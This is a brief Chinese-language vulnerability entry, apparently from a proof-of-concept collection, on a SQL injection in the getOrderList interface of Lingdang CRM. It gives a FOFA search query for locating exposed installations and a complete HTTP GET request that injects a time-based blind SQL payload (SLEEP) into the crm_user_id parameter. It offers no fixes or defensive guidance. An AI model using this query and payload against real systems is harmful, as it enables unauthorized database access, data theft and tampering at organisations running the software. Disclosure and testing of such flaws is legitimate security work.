# 灵当CRM系统接口getOrderList存在SQL注入漏洞

灵当CRM系统接口getOrderList存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```javascript
body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
```

## poc

```javascript
GET /crm/WeiXinApp/marketing/index.php?module=WxOrder&action=getOrderList&crm_user_id=1%20AND%20(SELECT%209552%20FROM%20(SELECT(SLEEP(5)))x) HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```

![image-20240919111854302](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409191119991.png)